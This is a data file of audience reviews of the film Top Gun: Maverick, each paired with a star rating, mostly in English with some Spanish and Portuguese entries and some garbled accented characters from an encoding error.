"Sin duda Tom Cruise sabe c√≥mo construir su propio g√©nero cinematogr√°fico, y lo que hizo en esta pel√≠cula es incre√≠ble. Si bien la trama funciona como homenaje para su antecesora, tambi√©n es una historia fresca que puedes ver sin tener un contexto previo. Emocionante y llena de adrenalina, con secuencias de vuelo y escenas de acci√≥n impresionantes. Adem√°s, aborda temas profundos, como el legado y la lealtad, as√≠ como el duelo y el crecimiento personal.",4
"Incredibly well done, an ABSOULUTE must see!!!",5
"I think the best way to describe this movie was: ""fresh air from the past"". Also better than the original. I can only think one other movie where I can say the same.",5
Instant classic. Tom Cruise is a cinematic God.,5
"Sound film like, no guns tho",3.5
"As a big fan of the original movie, even though not perfect, this return after decades comes, unexpectedly, near perfection.",5
Best of the two top gun movies....really well put together. Deserves an oscar.,5
"Super fun time. A throwback to the great, fun, action movies of the 80's and 90's. It is a little Star Wars-y and the first act rips off jokes from Eraser and Kill Bill 2. The Val Kilmer scene was gold.",4
Movie is great; Tom is still a weirdo,4.5
Best movie I've ever seen,5
Nice use of Val Kilmer. Great watch. I liked the ending the first time I saw it when it was called Star Wars.,3
Great movie! All the plane scenes were awesome. I just wish they would have left out the f14 part as that just was too cheesy and not realistic.,5
Best movie of 2022. A old fashion action movie made the way it should be. Great acting with characters you care about. Amazing visuals.,5
"Tengo que admitir que esta pel√≠cula en serio me encanto, es mejor que su predecesora y hasta incluso superior. Es mas emotiva, tiene mas acci√≥n, mejor calidad y una mejor historia que continua de muy buena manera el legado de la cinta original. Un Tom Cruise que sigue haciendo de la suyas interpretando un Maverick que entrena la nueva generaci√≥n de pilotos. El film respeta la esencia de su predecesora y lleva la historia a un nuevo nivel. Esta es sin duda una digna secuela que logro hacer lo que pocas secuelas han logrado. Top Gun: Maverick es una espectacular pel√≠cula y la clasifico con un 10/10.",5
I saw this same movie in 1986 with just a few changers and so predictable and so so slow-great flying and it is a little entertaining and great flying but you cannot crash 3planes like that and survive.,3
"Good acting, nice to see actors of color (Fanboy, Phoenix, Fritz and crew. Characters were well chosen for each role, if the characters don't mesh it ruins the move, even if the plot is great.",5
"like the original, this is a fun movie, but it is a better actual movie than the original. It builds stakes, priorities, and character arcs that weren't present before. outstanding.",5
"Meh, another generic Air Force movie. I really don't see what all the fuss is about. Visual effects were amazing though.",2.5
"After waiting so long for this sequel, it did not disappoint. My favorite movie of 2022. Miles Teller rules!",5
How do you get more badass than Tom Cruise? Great scene with Iceman. Awesome movie!,4
"The need for speed has become a full-blown addiction. Peter ""Maverick"" Mitchell (Tom Cruise) has remained a ""captain"" in the 35 or so years since the action of the original movie while his contemporaries had moved on to bigger (and more bureaucratic) positions. This movie is a throwback in all the right ways. At first, the ""danger zone"" opening got me going, but I had concerns that the sequel would rely heavily on nostalgia without providing much of a story ‚Äî these concerns were quickly assuaged. In fact, instead of going back to 1986, we are set into hyperdrive into the future as Maverick test-flies a plane for his pioneered ""Darkstar"" program, which continues with manhandled flight instead of the transition to drones. Besides this scene just being beautiful, it sets the tone for the movie that provides a blend of classic military competition (both in the air and shirtless ball-playing on the beach), a well-paced ‚Äî but not overbearing ‚Äî love story, and practical effects action. I was surprised, however, that the plane doesn't make a reappearance. ""Hangman"" (Glen Powell) is a ""villain"" straight out of a 1980s teen ski movie and antagonist to ""Rooster"" (Miles Teller), ""Goose's"" son who provides the motivation for Maverick throughout the story. The nameless, faceless villain is back and of course, I have the knee-jerk reaction of questioning why we're just bombing a sovereign nation, but that's not what this story is about. Top Gun is and always has been an isolated story of one school, one program, one class. Upon reflection, I didn't need the larger geopolitics ‚Äî I also very much appreciated that they kept the ""controversial"" Taiwan patch on Maverick's jacket. Top Gun: Maverick is the type of cinematic experience I just don't get from Marvel movies or Avatar and I couldn't be happier that this sort of movie still exists.",5
"Delivers in a HUGE way. Nostalgic, dramatic, fun, & action-packed...with a big heart.",5
Ready To Dive Back Into The Danger Zone,5
A great sequel in keeping with the original - some fantastic plane scenes too!,4
I truly could not pass more than 30 minutes watching this film.,1.5
It's the same story as the original. So disappointing.,2
"it is a great movie, nice action and great casting aswell.",5
"This was better than I thought it would be. Definitely plays into nostalgia for the first one, but only as much as it needs to in that it also stands great on it's own. The effects are great, and the story was actually decent. Pretty good pacing and acting round out a pretty great overall package. It's not going to be one of my favorites or anything, but I wouldn't mind seeing it again someday. 7.75/10",4
"Top Gun Maverick is such an exciting movie! First, let's start with the visual effects. This movie makes a great job in convincing you that you are actually really flying with all the pilots. Every plane sequence looks real. Top Gun 2 makes also a great work in showing the pilot's feelings and personalities. They are all egocentric and selfish, but their passion for flying is stronger and gives you the wants to keep working hard and continue dreaming. If you didn't do it yet, watch it in IMAX or in 4DX! DO IT! This is probably one of the greatest movies of this year. Final score: 9,2/10",4.5
"AMAZING MOVIE FROM START TO FINISH! From the cinematography, to the storyline. My adrenaline was going throughout this masterpiece!",5
Possibly the best movie ever.,5
Fantastic summer popcorn movie. Loved the original and the sequel hit the mark. Outside of the Star Wars Death Star trench run similarities it was a solid movie that is a must-see in a theater.,4.5
"Way too many similarities to the original, and not in a nostalgic way but in a rip-off way. Lazy plot and dialogue. Good cinematography makes it watchable, but just barely. I was excited for this sequel but was seriously disappointed.",1.5
Wonderful they just did everything perfectly unlike many modern films.,5
"Superb, much better than the first one. The themes explored are on point, the story is immersive, scenes are beautiful, great actors. A splendid experience.",5
"Phenomenal masterpiece, deserves more credit.",5
"Tom Cruise at his very best, this will be a legacy movie for him and he made sure it got made right. Amazing.",5
ABSOLUTELY PHENOMENAL! EXCEEDED MY WILDEST EXPECTATIONS!!,5
My absolute Favorite movie of 2022. Tom Cruise delivers in so many ways. The stunt team deserves all the accolades. Again Miles Teller is next level. It's extremely rewatchable and enormously nostalgic for anyone 30 and older.,5
"Per 10 USC 8323, 10 USC 1370, OPNAVINST 1811.3A, the entire basis of the movie is wrong. US Navy Captains (O6) are forced to retire after 30 years of service. Maverick was already a lieutenant when he first went to Top Gun in 1986. He would have been forced to retire around 2014. There are no Captains in the US Navy on flying status after 30 years of service, let alone sixty year old active flight instructors.",1.5
"The film is top notch entertainment. It is an intriguing story that flows perfectly, with great pieces of action and impressive filming and seeming realism. It also is fully suitable for those who have not seen the first movie. There is nothing not to like about this film, and has no flaws.",4
"I thought I'd need to rewatch the original Top Gun to refresh myself on the storyline. Ran out of time. This movie was a stand alone flick. Meaning, if you'd never seen the original Top Gun you likely still LOVE this movie! The action was gripping, Tom Cruise gets better looking year by year. The movie was ‚≠êÔ∏è‚≠êÔ∏è‚≠êÔ∏è‚≠êÔ∏è‚≠êÔ∏è‚ÄºÔ∏è‚ÄºÔ∏è‚ÄºÔ∏è I loved it!üôåüôåüôå",5
"Never thought that it would hold up to the original but was pleasantly surprised. Awesome movie, great plot, good acting, action, humor, heart- the whole package.",5
"Loved all the jet sequences. Tom Cruise was great as an older Maverick. Would give the original five stars because I enjoyed the cast of the original more the characters I felt we connected really good with them, but don't get me wrong. Love seeing iceman all these years later who doesn't love Val Kilmer ü´∂üèº",4
I went into this not expecting to enjoy it all that much but ended up loving it despite my initial reservations. It's a true spiritual successor to the great original and my only regret is that I waited to see it at home rather than seeing it at a cinema. If its reshown at my local cinemas I'll definitely be going to see it I enjoyed it so much. A really welcome surprise.,5
Terrific fun. The practical stunts were riveting.,4.5
"fantastic, a bit fanciful, but still very good",4.5
"The movie was great, but they recreated too mamy of the original scenes. It was still a great movie.",4
"Beautiful filmed, absolutely LOVED the practical stunts Tom cruise and team are amazing , and the story was also very good. If you haven‚Äôt seen this movie I recommend you go watch it right now .",5
Pure adrenaline filled emotional rollercoaster. Classic Tom Cruise at his best!!,5
"this movie is amazing, image quality, motion and everything is on point",4.5
"This movie was great. It had a great build up to the action, but it wasnt too slow. the character development was also really well done. I highly recommend this movie.",4.5
"Best movie of the year. This movie is emotional and has amazing action. The character development of new characters is great and of course, Tom Cruise knocks this performance out of the park",5
Tom Cruise does it again!,5
"it is great on many different levels. if you loved the 1st one, you'll love this one. if you never saw the 1st one, you can love this one, anyway. go see it on the big screen!",5
One of the best ive ever seen its so good,5
One of the best movies I have ever seen!,5
Great movie. One of my favorite movies of all time. Great planes and great watch on IMAX. Sound design was amazing. Plane flying over head felt like it was actually passing by the theater. Amazing!!,5
Taking the US Propaganda aside it was a great film. Had a good storyline and was very entertaining. Felt that it was better than the original. Excellent action scenes,4
"It should be a good action movie, but the weak script didn't help it. A lot of nonsensic scenes and dialogs, generic enemy, relations between senior officers and Maverick seems forced, some holes in the plot, forced happy ending. Maverick destroyed a 300 millions dollars experimental aircraft and he doesn't care. A lot of details piled up and spoiled the movie.",2.5
This movie was amazing Hollywood needs more of this,5
This film was pretty good üëçüèº,4
"Giving it two stars for the few exciting flight action scenes and the nods to nostalgia, deducting three for - the terribly predictable story my 14y old son could predict to the end after 10 minutes running time - the awfully kitsch tear jerker scenes taking up much of the too long running time - granting pilots instant jedi superhuman capabilities just by repeating calendar mottos repeatedly",2
"Is it blaphemy to say I maybhave liked this one even more then the 1st?! Ok, so there is no goose and awesome duets but overall I can say halfheartedly I enjoyed this one more then the 1st and it made me appreciate Tom Cruise again.",5
"It's the perfect sequel. Tom Cruise looks exactly the same as he did 36 years ago. This movie is fun on its own - it's fast-paced, it's badass, you care about the characters. But it also hits all the notes of nostalgia without being too much. Miles Teller's character pays homage to his father by playing Great Balls of Fire on the piano on the beach. Val Kilmer reprising his role is absolutely epic. Sweaty aviators playing beach sports together. They've even got a pretty dope soundtrack, just like the first Top Gun. There are also some nice updates for the modern era. There are female pilots for example. And Maverick realizes that it's not cool to be a total dick to women anymore. Like, they have feelings and families. Not really a thing in the 80s. Unfortunately, Meg Ryan had to step aside to make space for a new story, a decision I didn't want, but ultimately think was the right call. I didn't want to like this movie as much as I did, but it's nearly perfect. See it in theaters if you can, but definitely see it. Finally, thanks to Miles Teller for making summer '22 the summer of mustaches.",5
"How do people praise this movie!! The writing, the story, the acting is all bad. Bad I say! Honestly - they rehashed scenes from Top Gun that were just embarrassing. This movie should never have been nominated as a Best Picture option.",2
"Cinema perfection from a sequel in a post covid world. Top Gun Maverick is a wonderful and superbly made sequel to the original 80's Top Gun. Apart from Maverick, there's a whole slew of new cast members who not only act well, but also look very very good, which is par for the course for a Top Gun movie. Everybody pulled their weight and played their character properly that by the end of the the movie, I have to say that I liked every character in the movie. Story wise, having Mav still dealing with the loss of Goose and also being a step in father figure and teacher to Rooster (Goose's son) is an odd yet very welcomed changed to the tone of the movie compared to the first. Furthermore, having the Navy going against a ""faceless"" enemy is a smart thing to do as it provides good tension to the story. The romance is much better handled this time round with a much more respectful Mav towards woman, and no cringy unnecessary sex scenes. Music-wise, excellent compositions and song from Zimmer, Gaga and Faltermeyer. One Republic's mid movie song is an absolute bop. The cinematography and editing is on point. Having the pilots being in actual plains and shooting a fighter jet from another jet, really made every shot breathtaking to watch on an IMax screen. There's barely any CG to break the immersion of the story because the planes were really flying in the sky, and explosions for the most part are practically made. Overall, this is an absolute must watch and Blu-Ray purchase. Hollywood needs to know that these are the types of movies that people want to watch. No offense to the MCU (I love the MCU), superhero movies just don't have the charm of what movies like Top Gun can offer. If you have the chance to watch it in streaming, or replaying at your local cinema, do give it a watch.",5
"Cruise proves, once again, that great action movies aren't just muscles, CGI and stereotypes. Through Joseph Kosinski's wise and clever direction, a master in sequels and sagas (Tron Legacy), he becomes a real character, a real flight instructor and pilot, albeit gifted of a ""superhuman"" strength. However, he isn't anymore the protagonist of a propagandistic 1,40 hour long ad like the first chapter. After more than 30 years, due to the will of a dying ""Iceman"" (the performance of Val Kilmer is very touching), now admiral of the navy, test pilot Dave Mitchell is transferred to the Top Gun division with the goal to train a team that has to destroy an uranium enrichment plant. Among these young pilots Cruise finds Bradley ""Rooster"" Bradshaw (Miles Teller), son of his close friend and RIO ""Goose""; moreover, in the old bar near the base, he meets one of his old flames, Penny Benjamin (Jennifer Connelly). A film critic once said that one clich√© is ridiculous, one hundred all togheter make you cry. And this movie does so as well as exploring many human relationships: on all, the misunderstandings between Teller and Cruise and the disillusioned love between the latter and Connelly. Lady Gaga's ""Hold my hand"" is very beautiful in addition to the historic song from the first film by Moroder.",4
"Tried to watch it, but couldn't get past the first 20 minutes. Contrived and childish plot, no likable characters. Tom Cruise casting is ridiculous--a little old dweeb still trying to play macho roles. It's time for him to hang it up. All the action and special effects in the world can't make up for this stupidity.",1.5
"didn't think it would be any good (i was wrong) so waited till now to watch. this one was mostly a pleasant suprise, and better than the original. still, was let down by the last 20 minutes, and the fact that it would not have been as good if you did not watch that first movie. worthy of another watch some day for sure.",3.5
"It will be hard to top this movie, which both pays homage to the past but also moves the story forward with interesting new characters. Top cruise's stunts continue to be top-notch and absolutely stunning especially considering how dangerous they continue to be to produce.",5
a great follow up to the original. equal parts nostalgia and fresh material.,4
"Totally unrealistic and vague on who the enemy was. Very predictable plot, and Disney like ending. Just very bad. What was the point of the whole movie from the original? It was not creative or suspenseful. No more sequels, please.",1
Who are they fighting and why? Worst movie I have seen in a long time.,0.5
"One of the best movies I've seen Tom Cruise in. This was amazing all leads were multi dimensional, this was a classic in its own right I enjoyed it better then the first Top Gun. Maverick as a character evolved to be better, it was so much good in this movie as it progressed very well. Miles Teller was outstanding as Goose's son he did his role justice, a great film start to finish rate 10/10",5
A cinematic masterpiece that earned it's billion dollars,5
"Soaring high and gracing the stratosphere, Maverick rattles the theater seats with not just its engaging action sequences but memorable characters and continuation from the late-80s hit that may even exceed the original. Excellent script and plot points that expand on what it means to truly be a top gun.",5
"Ok, only 66 min left, but this movie is so bad? Its like if the original movie, got re made, by the Top Gun original movie, after it got re made? Its like watching the same play, by different actors?",2
‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶.. 9.1/10,4.5
Really doesn't break any new ground but the flying scenes are terrific. The storyline? meh,3.5
Great film!! Love how goose‚Äòs spirit is still kept alive,5
I missed good movies. Thanks.,5
"too simplistic a rehash of the original story, but fun action if your expectations are low",3.5
I think that this is a great action-packed family movie to see! It is definitely a must see for everyone! I would say it is even better than the first and is arguably the best movie that I have ever watched!,5
"This show is great, wonderful visuals and Tom Cruise has the screen presence like no one else. Great show!!!",4
"Top Gun Maverick is a fantastic sequel to the first film, and very enjoyable to experience!",5
"A great movie, better then the original! Amazing flight scenes!",5
Brings back the summer blockbuster of years past. A lot of fun and just plain enjoyable. (It also borrows heavily from Star Wars: Episode 4.),4
The most overrated movie in years,0.5
Perfect. In every way.,5
"Amazing, enough said",5
This movie is one of the best I've seen. I personally wasn't the biggest fan of the first one. But this movie is just so good and can stand as it's own movie. And the action in this movie is next level.,5
Just good enough like for a Sunday afternoon.,3.5
Got the feels and the appeals. Perfect movie to indulge in and forget about the stuff you've got to deal with for 2hrs.,5
"It is an awsome, Aktion packen movie withe best cinematography and character I have ever seen. Easily my 2. Favorit movie!",5
"Way too many corny cliche 80's/90's parts, but enjoyable mostly.",3
"There is no other movie of 2022 I was absolutely blown away by like Top Gun: Maverick. The action: 10/10, The acting: 10/10, The story: While a bit clich√® it is still a really quite powerful and touching one 9.5/10, The characters: 10/10. I don't want to give you full in depth review because I'm sure there are 100s of videos on YT that have described this movie perfectly already. The only thing I can say is, it is absolutely fantastic and is my favorite film of 2022.",5
"Predictable, contrived, unimaginative script‚Ä¶but gives viewers what they want. Nostalgia and action.",4
"So much better than the original, Maverick does not listen to the rules, he manages to break them, but he shows why he is the best and cannot be replaced",4
Amazing flying scenes. Even better than the original,5
"Utterly predictable, packed with cliches... yawn.",2

more like Toppest gun,4
Lets make it short. A MASTERPIECE made for cinemas and movie lovers. 9/10 Lovestory was a little bit weak.,5
This might be better than top gun,5
"This movie is so perfect you want to watch it again and again as soon as it finishes. Great story, great casting, great acting and great action...Tom Cruise is like a good wine: older is way better",5
"Easily the best movie of 2022, Tom Cruise and Miles Teller absolutely killed it and it is a must see.",5
"Amazing movie‚ÄîMUCH better than the original. Much better script, amazing aerial scenes. A classic.",4.5
"Tenet accidentally found itself charged with saving cinema as the first big post-Covid release out of the gate. For all its technical excellence, it tied itself up in knots and was nowhere near fun enough for the job. Top Gun: Maverick waited, and waited, and waited some more. Release dates kept being pushed back until we thought it was something they were trying to hide in embarrassment. How wrong we were. It's a blast and one that perhaps only someone like Tom Cruise could deliver with his ridiculous work ethic and innate understanding of what audiences want. It's exciting, spectacular and a whole heap of unashamed fun. If it glorifies the military-industrial complex too much, then some of us may need to remember that it's possible to enjoy a piece of art for what it is and not buy into its undergirding principles. This is a film that arrived precisely when we all needed some big-screen fun and is perfectly crafted by a group of people who innately understand just how to deliver that. Love it for what it is.",5
"Fun movie but as with all action movies, not very realistic. Speaking from experience from serving 40 yrs in the USMC and USN.",4
Tom at his best!! I did watch the first one again before I went to see this. It is a must-see!!,5
"This is one of those sequels where it's better than the original, I like the flight scenes and the story itself was ok but exciting. The only issue would be more flight action scenes as those were fantastic. Overall, great entertaining film certainly better than most modern films. Great job Tom!",4.5
It is just really watchable and enjoyable. A spot on sequel.,4
"Movie like they should be, no preaching just a good old fashion entertaining movie",4.5
"Slick and action packed without having grown men dressed up like comic book characters. Better than the original Top Gun and much more diverse, particularly with a female pilot taking a lead position and not just there for show as in, ""look, there's a chick in the back row. See, we're diverse."" Val Kilmer tugs at your heart.",5
"Amazing!!! Brought back teenage memories, a lot of sighs in love with this amazing Tom Cruise! No, this is not a remake, but continuity, a reunion with the past: Tom perfectly knew how to catalyze the pain of losing his best friend in the first film and showed us another side of Pete with delicious sensitivity. Jennifer Connely rocked Penny and left me with a headache with so much beauty in those green eyes of hers... The Rooster's uncanny resemblance to the Goose absolutely floored me! Miles Teller already caught my attention in Whiplash and in this Top Gun he just confirmed what I already knew, a great young actor! The scenes with the fighters are breathtaking, impressive and incredible and I won't even mention the scenes with the iconic Kawasaki! The cinematography of the film is sensational too. I recommend it to anyone who hasn't seen it yet, watch it in 3d or 4d, I believe the experience is even cooler!",5
It's not overrated at all. Top Gun deserves all the praise it has been getting. Outstanding movie.,5
One of the best movies of the past decade!,4.5
Top Gun: Maverick is a great and very entertaining movie!,4
"I love that it has elements of the original but I feel the fact that it is set so far in the future, ageing both Tom Cruise as Maverick and Goose's son out of the likelihood of the program belies its veracity. Part of the charm of the original film was the youth and recklessness of its young protagonists. I also feel that it is locked in to the seriousness of the mission and loses some of the warmth and humour that the original possessed.",3
"Acting is good. But the plot is so very predictable. ƒ∞t feels like you have seen it. But it's a nice watch, no more than that-oscar nomination for what exactly?",3
Best film ever! Ready to win Best film of the year! Tom Cruse best actor!,5
"""This movie might of saved the entire theatrical industry."" - Steven Spielberg If you're looking for a movie that's Patriotic and shows the military in positive light. This movie actually was an experiment by Hollywood by making it woke free and the only colors it celebrates are those of our flag, the stars and stripes. Since this film trumpeted the above, the Chinese financiers aka CCP wouldn't fund it. So they had to find funding for Top Gun Maverick else where. Making it a financial risk and a kind of canary in the coal mine for future projects that'll make you almost forget who's commander and chief.",5
Good movie - very predictable,3.5
A good fun time summer blockbuster with some really great dog fight scenes solid sequel to a mid movie 8/10,4
So refreshing to see a movie without pushing a narrative on its audience. these days. Great action and how a sequel should be done.,5
"Tom's back for more G force pushing flights and a new group of fliers that he's now training. But when the mission time comes, only he can pull all of it off. Nostalgic and complete even without Meg Ryan, it's a classic nod to the greatness of the original.",3.5
"Incredible sequel. Going forward, this movie should be the blueprint for any reboot or sequel. Incredible movie, best I have seen in a while.",5
In 20 years they will make another one with Rooster's son... Maverick will come and save the day!,2
Unbelievable. Surpasses the original in every way.,5
Pleasantly surprised. Enjoyed more than the first,4
"Clearly the worst ""Best Picture"" nominee in the Academy's history, this steaming pile of cow dung isn't worth a review. It's the worst thing that Tom Cruise has ever done, and I'm including ""Legend"" in that. It's the worst thing that Miles Teller has ever done, and he isn't exactly Marlon Brando. I realize that the Academy wants to appeal to a broader audience, but they should have started with 'the Dark Knight', not this worthless exercise in unnecessary sequels.",2
"Well made, and as much as I don‚Äôt care for Tom Cruise, he does deliver the goods.",4
Fun but predictable. But fun!,3.5
Really fun movie. Better than the first.,4.5
This was worth the wait. Fantastic piece of cinema,5
Probably even better than the first Top Gun.,5
"Outstanding! Love any movie that promotes American exceptionalism and masculinity! We need more like this, fast!",4.5
"Top Gun: Maverick is an impressive summer blockbuster, and not just for the reasons you'd think. Are the high-flying, vertigo-inducing plane scenes a thrill to behold? Yes; simply stunning and shot in a way that truthfully makes you feel as if you're in the cockpit. These scenes are numerous throughout the film and really form the basis for devouring this popcorn movie. Outside of the planes though the story can get threadbare and forced. The main plot involves Maverick training new Top Guns to destroy an unmarked uranium processing plant in an unnamed country using tactics loudly reminiscent of The Death Star trench run including having to fit a missile into a missile-sized hole. Some might say the hole isn't much bigger than a womp rat. Anyways, the out-of-cockpit stuff meanders, but Tom Cruise's devil-may-care demeanor helps sell the package and this is the other main reason why Top Gun: Maverick is so impressive. The entire plot is built on top of a landfill of clich√©s, but somehow it works and the film might even be better for it. One of Maverick's students happens to be Goose's son (Miles Teller as Rooster), inevitable conflict emerges. Maverick bumps into his old flame Penny (played by Jennifer Connelly) and while the film would like us to believe that it was happenstance it can't sell that conclusion very well. The rest of Maverick's class of Top Guns might as well be faceless they're so paper-thin. It all culminates almost exactly the way you think it will and still it was a joy. It's a strange film that shouldn't work, and occasionally it doesn't albeit briefly, but largely does due to its willingness to lean into the fun campiness of a summer action film despite costing something in predictability. This is a risky gambit, expecting people to know what they want is historically a fool's errand. But Cruise and company pull it off with this exciting blockbuster that's worth going to the theater to see.",3.5
Overrated sorry not for me.,1.5
"It's a very good movie, but you didn't need me to tell you that. It's very similar to the first however, so it is not original.",4.5
No es mala pero tampoco me mat√≥. Creo que toman en cuenta ese cine muy Hollywood y destacando a Tom Cruise en este tipo de pel√≠culas que solamente √©l sabe hacer. Audiovisuales 10/10.,3.5
"I have no nostalgia for the first Top Gun movie-I watched it for the first time a few weeks before seeing this one. However, this movie has that nostalgic feel to it while still feeling like a defined, separate movie. The action is really cool and Miles Teller brought it for this movie, and that's coming from a gal who isn't the biggest Teller fan. Definitely would recommend watching this whether you've seen the first one or not.",4
"Oh baby, give me that adrenaline rush!",4
"This is definitely a film that I will get five stars too, I do not give five stars out, and I believe this is the first film that I have actually done that since doing my reviews with rotten tomato. This movie is action packed, perfect dialogue, and straightforward, cinematic masterpiece. This film shows that it is perfectly fine to drag from the original, and make it even better. Being Tom Cruise‚Äòs first billion dollar picture blows my mind, but at the end of the day this movie was far above and beyond what we expect it . This was an exciting, amazing thrill ride with outstanding cast, and a fantastic story line. This is a re-watchable movie multiple times over and over again, and never getting old and never feeling stale. This is one for the record books. Definitely highly recommend checking out this film if you have not already.",5
"Wooden acting, predictable story line, jingoistic claptrap...jets zooming around performing unlikely maneuvers in between the most sickly corny exchanges...couldn't wait for the end",0.5
Really not that good. Full on self importance light on everything else. But sure made me realize that a lot of other people sure are yearning for the ‚Äògood ‚Äòol days.' Ah how simple things must have been back then‚Ä¶,2
"I was on the edge of my seat, Mindblowing effects and men",5
Enjoyed it! My husbands a big fan and he loved it as well!,5
Finally got to see this. Wish I would've seen it in theaters. I was standing up for the entire final sequence of the film. WHAT A RUSH.,5
Loved it. Even though it has its cheeses moments it‚Äôs a quintessential summer block buster. Worth seeing in theaters. Worth full price ticket,4
"Top Gun: Maverick finds itself in rare company as the sequel that found a way to surpass it's predecessor. The perfect combination of action, drama and nostalgia will keep you entertained for the entire 2 hour 11 min ride.",4.5
"My Lord Tom, not many movies this day set a standard like this. I watched this on Paramount Plus on a 60-in screen surround sound and doesn't do it justice. There is not many movies today that arise to this level.",4.5
"Best sequel in years. As a fan of the original, I was fully prepared for this movie to be so bad it detracts for the original. What a pleasant surprise. This movie did great by the first one. As far as action movies go, this one checked many boxes. Just enough fan service, without being sickening. You know what I mean. So many sequels today are too busy with fan service to tell a decent story. I would actually watch this again.",4.5
"Sure it was nicely done with a lot of throwback references, but all the 5 stars must be coming from people who never saw the original. It was nearly a remake, rather than a sequel, with a more convoluted story‚Ä¶.but still great fun to watch.",4
"Rating this movie at 90% plus is an insult to movie making. It's like you put Cruise in a movie and all the critics can't wait to give it outstanding review cause they're mesmarized. Old Tom Cruise on his motor cycle zooming around with a chick on the back eventually. Dog fight training like they were in the skies over England during WWII. The low level flying through the canyons a rip off of the ending of the first Star Wars movie. A manufacted threat, sappy flashbacks to characters in the original movie and a broken Val Kilmer backing Maverick the dying. Everything about this movie was ridiculous.",2
It was good and I enjoyed it but watch the first one and twist the theme just a bit essentially the same movie.,3.5
"Great cinema experience and gripping, one of the best action movies I've seen.",4.5
Might just be the best movie of the year.,5
In film veryyyy veryyyy goode yani bi nazire,5
Painful and cringeworthy remake pretending not to be a remake. I couldnt even be bothered to watch the end. Same story. Same music. Same setting. Why do they bother? Oh right cos heaps of people will bother.,1
Great movie! almost as good as the original. And that says a lot!,5
"I really liked this movie! Just the right amount of drama, action and a little love story!",5
Outstanding Performance,5
It's exactly what I expected it to be - a glossy cheesefest designed for middle aged men. I really don't understand the great reviews - it's well made but extremely predictable. Feels like it was written by an A.I. at times,2
So much adrenaline pumping action and stunning visuals. More than a movie it was an experience. Can't think of a better way to bring back an older movie than what they did with it,5
"Bad Plot, unrealistic mission just a lot of cheesy nostalgia shoehorned into an incredible setting. Avoid.",0.5
Excelente sequencia. A Disney deveria aprender a fazer filmes assim e parar de fazer tanto lixo.,5
"Should Win ""Best Picture"" by a Landslide and is one of the Best made Films I've watched in the last 10 years! Absolute Block Buster Movie that breaks all barriers the way that Really Good Movies used to be Made!!! When considering ""Best Motion Picture"", I believe that it must contain all aspects of what it takes to make an Excellent Motion Picture, such as Crazy and New types of Footage with Awe inspiring Filming, along with a Great Story that has no need of Sexuality to sell tickets and it all must appear to be Believable! ""Top Gun Maverick"" gives the viewer every possible emotion to go along with a phenomenal story as a Sequel and the Film is watchable over and over, and simply will out live the Test of Time, just like the Original ""Top Gun"" did. I knew what went into making this movie and was told that I had to see it in an Actual max theater. I paid for tickets to see ""Top Gun Maverick"" at the Theater for $49 for 2 seats for the 1st time in 25 years, because films aren't worth seeing in theaters anymore, but this one had to be seen in the theater and my Son gave it to me for Christmas and I've watched it many times over!",5
"Espetacular, a emo√ß√£o de estar dentro dos ca√ßas nos deixa com a adrenalina a mil. Hist√≥ria simples, bem feita e emocionante. O melhor de 2022 sem d√∫vidas.",5
"Just good, clean fun man. A great sequel and a great all-around movie. Such a popcorn movie.",4
"Waited 30 years for this movie! The love story was disappointing - I just didn't feel the connection. Otherwise, the movie exceeded all my expectations!",4
"90% Hollywood ""cheese""...however, the 10% of actual jet action makes up for the weak 90%, in spades. Working in Val Kilmer, even saying a few words, was high quality. Just too much Tom Cruise glorifying himself to give a full 5 stars. I do commend him for his flying skills. That's legit. No way this movie succeeds without real piloting. There's no way dated jets survive the ""gen 5"" supersonic fighters, but that is easily overlooked for movie drama. Stealing a foreign jet and surviving without ammo against ""gen 5"", laughable. Not to mention the suicide mission plan being a direct ripoff from the original Star Wars. Redeeming scenes include the training session in which Cruise flys the practice course for all to witness. And, the training defeats of all the young pilots. Would it be better in a theater? Not much. Would I watch it again? Parts, but not the whole. Bollywood cheese doesn't sit well in my stomach.",4
"This is not only a great reboot/sequel, it is also a great movie. It doesn't rest on nostalgia and fan service. It tells a new engaging story that intrinsically weaves nostalgia and fan service into this new and better story. Tom Cruise gave his best performance to date in this one. Bravo!",4.5
So much action but nobody died,5
"What a cinematic spectacle this sequel to the 1986 feature film is! Top Gun: Maverick is undoubtedly one of the pleasant surprises of 2022. The plot is sensational with a delicious mix of action and adventure and a gala performance by Tom Cruise, he made the protagonist of the plot Captain Peter ""Maverick"" Mitchell age as well as wine.",5
"Seguramente, Top Gun Maverick est√° no meu top 5 de melhores filmes de sempre. A excelente hist√≥ria aleada a boa produ√ß√£o, atores e efeitos especiais fazem deste filme: Um grande filma√ßo.",5
Thanks Tom for making a movie worth seeing again!,4.5
"To be fair, the cinematography was excellent and the action in the air was lots of fun to watch. But the rest of the film, sucked and not just a little. Just the whole mellow dramatic tone, until it isn't. And then suddenly it shifts to day at the beach like a friggin Pepsi commercial! It's just all so stupid.",0.5
"This was an amazing film. Although I thought it started off a little slow, I did enjoy it throughout. The characters did a great job for the most part. 9.1 out of 10.",5
Amazing! It was so nolstalgic to see Maverick flying!!! Definitely a good movie.,5
Melhor filme dos √∫ltimos 5 anos pelo menos excelente sonoplastia fant√°stica cenas muita boas vc se segura na cadeira e vira junto com os pilotos.,5
"An almost flawless film. Amazing cinematography and perfect ensemble with incredible action sequences. A good love story, great soundtrack, and an overall good time. Best film of the year!",5
"3-Stars is a funny score for me as I really liked the film, but then it really didn't do it for me. Usually when you have a war movie (which this was.. in a sense) the bad guy is someone you want to see get what was coming to them, but this film was the first I can remember where the enemy was just ""the enemy"". It was a paper bad guy and to this day, I don't know who they were supposed to be. The 6th Gen fighters certainly looked Chinese but the bad guys running around where Caucasians. I liked the sentimentality element but I didn't like some of the casting particularly Miles Teller. I saw him as a bad guy in a couple of movies. He played them very well but his persona is just not sympathetic. Strangely enough, Hangman despite the overbearing cockiness was great and would have been a better SOG (son of Goose). Overall well worth watching despite its obvious flaws.",3
Hands down best movie of 2022.,5
Ah... Top Gun was a good film for its time.... but TG Maverick is a pale retread taking the original script and aging it 25 years. Some things don't get better with age. if you saw Top Gun you've seen TG Maverick. Sure the jet flight sequences were fine... but so what. Cruz does the same motorcycle race with the jet and the entire film languishes in first gear. There was nothing inherently new about this film. At least it wasn't another super hero reinagined for the twnth time.,1.5
Worst film I have ever tried to watch. Cringe factor is off the radar. Must be for the brain washed.,1
What a ride - just like the first Top Gun - but in some ways better with age!,5
Incredible! Peak Kino. State-of-the-art-oscar-winning stuff going on in here.,5
